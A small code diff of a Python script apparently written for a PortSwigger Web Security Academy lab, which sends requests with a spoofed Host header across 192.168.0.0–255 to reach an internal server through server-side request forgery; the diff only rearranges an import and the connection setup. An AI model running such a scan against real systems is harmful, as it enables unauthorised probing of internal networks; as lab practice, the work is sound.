@@ -1,11 +1,10 @@
-import requests
+from bs4 import BeautifulSoup
 import http.client
 
 url = 'https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net/?https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net'
+connection = http.client.HTTPSConnection("acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net")
 
 def SSRF():
-    connection = http.client.HTTPSConnection("acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net")
-
     for i in range(0, 256):
         connection.request("GET", "https://acd41f1f1ed299e6c157eae2005800e1.web-security-academy.net/", headers={
             'Host': '192.168.0.' + str(i),
@@ -17,5 +16,5 @@ def SSRF():
             print(i)
             print(response.read().decode())
             break
-    
+
 SSRF()
